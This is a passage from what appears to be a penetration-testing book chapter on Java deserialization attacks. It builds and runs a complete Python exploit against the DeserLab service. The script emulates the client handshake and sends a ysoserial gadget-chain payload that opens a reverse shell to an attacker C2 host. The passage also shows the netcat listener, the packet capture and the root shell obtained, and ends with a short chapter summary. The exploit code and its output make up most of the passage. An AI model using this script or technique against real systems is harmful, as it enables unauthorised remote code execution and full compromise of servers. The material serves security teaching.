<span class="strong"><strong>target</strong></span>.connect((<span class="strong"><strong>target_host</strong></span>, <span class="strong"><strong>target_port</strong></span>))</pre></div><p>At this point, our script will emulate the DeserLab client, and in order to successfully connect and be able to send our exploit code, we have to perform a few steps first. Recall that the client sends a few required bytes, including the hello packet and client version.</p><p>We will use the <code class="literal">send()</code> and <code class="literal">recv()</code> methods to send and read the responses, so that the communication can move along. Since some bytes can be outside of the ASCII readable range, we should escape them using their hex equivalent. Python allows us to do this using a backslash (<code class="literal">\</code>) and <code class="literal">x</code> prefix to the hex bytes. For example, the character <code class="literal">A</code> can be represented in Python (and other languages) using <code class="literal">\x41</code>.</p><p>After we perform a send, we should also receive any data sent from the server. We don't need to store the server response, but we do have to receive it to clear the buffer and allow the socket communication <a id="id400" class="indexterm"/>to continue.</p><p>First, we will send the <code class="literal">0xAC 0xED</code> magic bytes, followed by the hello packet, and finally the expected client version. We have to prefix the hello and version packets with the <code class="literal">0x77</code> byte, followed immediately by the data length. For example, the client version being <code class="literal">0x01 0x01</code> would need to be prefixed by <code class="literal">0x77</code> (indicating a data packet), and by <code class="literal">0x02</code> (the data packet length).</p><p>The following code will send the magic bytes, hello packet, and client version:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong># Send magic bytes and version</strong></span>
target.send("<span class="strong"><strong>\xAC\xED\x00\x05</strong></span>")
target.recv(1024)

<span class="strong"><strong># Send 'hello' packet</strong></span>
target.send("<span class="strong"><strong>\x77\x04</strong></span>")
target.send("<span class="strong"><strong>\xF0\x00\xBA\xAA</strong></span>")
target.recv(1024)

<span class="strong"><strong># Send client version</strong></span>
target.send("<span class="strong"><strong>\x77\x02</strong></span>")
target.send("<span class="strong"><strong>\x01\x01</strong></span>")
target.recv(1024)</pre></div><p>We also have to send the client name, which can be arbitrary, but it is required. We just have to make sure the <code class="literal">0x77</code> prefix and the data length are accurate:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong># Send client name: test</strong></span>
target.send("<span class="strong"><strong>\x77\x06</strong></span>")
target.send("<span class="strong"><strong>\x00\x04\x74\x65\x73\x74</strong></span>")</pre></div><p>Finally, we have to strip the magic bytes from the payload itself, as we've already sent these. The server expects the object without this data. Python allows us to remove the first four bytes using the <code class="literal">[4:]</code> array notation:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong># Remove the 0xAC 0xED magic bytes from the payload</strong></span>
payload = payload<span class="strong"><strong>[4:]</strong></span>
</pre></div><p>The final step is to send the ysoserial payload which, when deserialized, will hopefully execute our reverse shell:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong># Send the ysoserial payload to the target</strong></span>
print "[+] Sending payload..."
target.send(<span class="strong"><strong>payload</strong></span>)
target.recv(1024)

print "[+] Done."</pre></div><p>The final <a id="id401" class="indexterm"/>exploit script, <code class="literal">exploit_deserlab.py</code>, should look like the following:</p><div class="informalexample"><pre class="programlisting">import socket

target_host = '<span class="strong"><strong>deserlab.app.internal</strong></span>'
target_port = <span class="strong"><strong>4321</strong></span>

<span class="strong"><strong># Open the ysoserial generated exploit payload</strong></span>
print "[+] Reading payload file..."
f = open('<span class="strong"><strong>deserlab_payload.bin</strong></span>', 'rb')
<span class="strong"><strong>payload</strong></span> = f.read()
f.close()

target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
target.connect((target_host, target_port))

<span class="strong"><strong># Send magic bytes and version</strong></span>
target.send("<span class="strong"><strong>\xAC\xED\x00\x05</strong></span>")
target.recv(1024)

<span class="strong"><strong># Send 'hello' packet</strong></span>
target.send("<span class="strong"><strong>\x77\x04</strong></span>")
target.send("<span class="strong"><strong>\xF0\x00\xBA\xAA</strong></span>")
target.recv(1024)

<span class="strong"><strong># Send client version</strong></span>
target.send("<code class="literal">\x77\x02</code>")
target.send("<code class="literal">\x01\x01</code>")
target.recv(1024)

<span class="strong"><strong># Send client name: test</strong></span>
target.send("<span class="strong"><strong>\x77\x06</strong></span>")
target.send("<span class="strong"><strong>\x00\x04\x74\x65\x73\x74</strong></span>")

<span class="strong"><strong># Remove the 0xAC 0xED magic bytes from the payload</strong></span>
<span class="strong"><strong>payload</strong></span> = <span class="strong"><strong>payload[4:]</strong></span>

<span class="strong"><strong># Send the ysoserial payload to the target</strong></span>
print "[+] Sending payload..."
target.send(<span class="strong"><strong>payload</strong></span>)
target.recv(1024)

print "[+] Done."</pre></div><p>Before launching the exploit, we have to make sure a netcat listener is running on our C2 server <code class="literal">c2.spider.ml</code> on port <code class="literal">443</code>. If the exploit is successful, we should get shell access to the DeserLab server.</p><p>We can start a<a id="id402" class="indexterm"/> netcat server on port <code class="literal">443</code> using the following command:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@</strong></span>
<span class="strong"><strong>spider-c2-1:~# nc -lvp 443</strong></span>
<span class="strong"><strong>listening on [any] 443 ...</strong></span>
</pre></div><p>All that's left to do is to run the Python script on our attacker machine and hope for the best:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@kali:~/tools# python exploit_deserlab.py</strong></span>
<span class="strong"><strong>[+] Reading payload file...</strong></span>
<span class="strong"><strong>[+] Sending payload...</strong></span>
<span class="strong"><strong>Done.</strong></span>
<span class="strong"><strong>root@kali:~/tools#</strong></span>
</pre></div><p>If we inspect the generated traffic, we can see the protocol initiation and the test string packets, followed immediately by the serialized object generated with ysoserial, indicated by the <code class="literal">0x73 0x72</code> or <code class="literal">sr</code> bytes:</p><div class="mediaobject"><img src="graphics/B09238_08_11.jpg" alt="Deserialization exploit"/></div><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>0000000A  77 02                                              w.</strong></span>
<span class="strong"><strong>    0000000C  01 01                                              ..</strong></span>
<span class="strong"><strong>0000000C  01 01                                              ..</strong></span>
<span class="strong"><strong>0000000E  77 06 00 04 74 65 73 74  73 72 00 32 73 75 6e 2e   w...test sr.2sun.</strong></span>
<span class="strong"><strong>0000001E  72 65 66 6c 65 63 74 2e  61 6e 6e 6f 74 61 74 69   reflect. annotati</strong></span>
<span class="strong"><strong>[...]</strong></span>
<span class="strong"><strong>000007EE  00 00 00 00 00 00 00 00  00 00 78 70               ........ ..xp</strong></span>
</pre></div><p>Further down into the packet capture, we notice something interesting in the server response:</p><div class="mediaobject"><img src="graphics/B09238_08_12.jpg" alt="Deserialization exploit"/></div><p>The server responds with a <code class="literal">java.lang.ClassCastException</code>, meaning that it attempted to cast our payload to <code class="literal">HashRequest</code> but failed. This is a good thing because by the time the exception is<a id="id403" class="indexterm"/> trapped, the POP gadget chain succeeded and we have a shell waiting on our C2 server:</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~# nc -lvp 443
listening on [any] 443 ...
connect to [10.2.0.4] from deserlab.app.internal [11.21.126.51] 48946
<span class="strong"><strong>id    </strong></span>
<span class="strong"><strong>uid=0(root)</strong></span>
<span class="strong"><strong> </strong></span>
<span class="strong"><strong>gid=0(root) groups=0(root)</strong></span>
</pre></div></div></div>
<div class="section" title="Summary"><div class="titlepage"><div><div><h1 class="title"><a id="ch08lvl1sec51"/>Summary</h1></div></div></div><p>In this chapter, we've looked at another way that user input can be abused to execute arbitrary code on vulnerable applications. Serialization is very useful in modern applications, especially as they become more complex and more distributed. Data exchange is made easy, but sometimes at the expense of security.</p><p>In the preceding examples, applications were compromised because assumptions were made about the process of deserializing data. There is no executable code in the object stream, not in the traditional sense, because serialized data is just a state snapshot of the object. It should be safe, as long as the language interpreter reads the input safely. That is to say, if there is no buffer overflow or similar vulnerability. As we've seen, however, we don't need to exploit the Java virtual machine or PHP's interpreter to compromise the system. We were able to abuse deserialization features to take control of the application execution flow with the help of POP gadgets.</p><p>In the next chapter, we will focus practical attacks specifically directed at the user, leveraging application vulnerabilities.</p></div></body></html>